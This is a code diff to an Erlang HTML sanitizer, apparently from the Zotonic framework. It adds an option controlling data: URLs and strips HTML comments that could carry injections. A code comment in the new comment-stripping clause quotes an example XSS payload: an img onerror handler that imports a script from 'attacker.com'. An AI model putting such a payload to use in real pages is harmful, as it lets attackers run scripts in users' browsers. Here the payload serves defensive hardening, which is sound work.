@@ -23,6 +23,7 @@
 
 -export([
     uri/1,
+    uri/2,
     default_sandbox_attr/1,
     ensure_safe_js_callback/1,
     escape_props/1,
@@ -45,15 +46,29 @@
 
 %% @doc Ensure that some characters are escaped, URLs copied from the browser can contain
 %% UTF-8 characters that need to be percent-encoded befor further processing is possible.
+%% Does NOT allow data: URLs.
 -spec uri(Url) -> EncodedUrl when
-    Url :: binary() | string() | undefined,
-    EncodedUrl :: binary().
-uri(undefined) ->
+            Url :: binary() | string(),
+            EncodedUrl :: binary();
+         (undefined) -> undefined.
+uri(Url) ->
+    uri(Url, false).
+
+%% @doc Ensure that some characters are escaped, URLs copied from the browser can contain
+%% UTF-8 characters that need to be percent-encoded befor further processing is possible.
+%% Allows data: URLs.
+-spec uri(Url, IsAllowData) -> EncodedUrl when
+            Url :: binary() | string() | undefined,
+            IsAllowData :: boolean(),
+            EncodedUrl :: binary();
+         (undefined, IsAllowData) -> undefined when
+            IsAllowData :: boolean().
+uri(undefined, _IsAllowData) ->
     undefined;
-uri(Url) when is_list(Url) ->
-    uri(unicode:characters_to_binary(Url, utf8));
-uri(Uri) ->
-    z_html:sanitize_uri(Uri).
+uri(Url, IsAllowData) when is_list(Url) ->
+    uri(unicode:characters_to_binary(Url, utf8), IsAllowData);
+uri(Uri, IsAllowData) ->
+    z_html:sanitize_uri(Uri, IsAllowData).
 
 
 default_sandbox_attr(Context) ->
@@ -144,12 +159,9 @@ sanitize_element_opts({<<"a">>, Attrs, Inner} = Element, _Stack, _Opts, _Context
         false ->
             Element
     end;
-sanitize_element_opts({comment, <<" [", _/binary>> = Comment} = Element, _Stack, _Opts, _Context) ->
+sanitize_element_opts({comment, <<" [", _/binary>>}, _Stack, _Opts, _Context) ->
     % Conditionals by Microsoft Word: <!-- [if (..)] (..) [endif]-->
-    case binary:last(Comment) of
-        $] -> <<>>;
-        _ -> Element
-    end;
+    <<>>;
 sanitize_element_opts({comment, <<"[", _/binary>>}, _Stack, _Opts, _Context) ->
     % Conditional comment, as used for Outlook <!--[if mso]>..<![endif]-->
     <<>>;
@@ -188,6 +200,13 @@ sanitize_element_opts({comment, <<" z-media ", ZMedia/binary>>}, _Stack, _Opts, 
                 zmedia => ZMedia
             }),
             <<" ">>
+    end;
+sanitize_element_opts({comment, Comment} = E, _Stack, _Opts, _Context) ->
+    % Remove comments that might contain injections for e.g. html editors.
+    % For example: <!--data-mce-selected="x"->"><img src onerror=import('//attacker.com')>-->
+    case binary:match(Comment, [ <<"<">>, <<">">> ]) of
+        nomatch -> E;
+        _ -> <<>>
     end;
 sanitize_element_opts({Tag, Attrs, Inner}, _Stack, _Opts, _Context) ->
     Attrs1 = cleanup_element_attrs(Attrs),
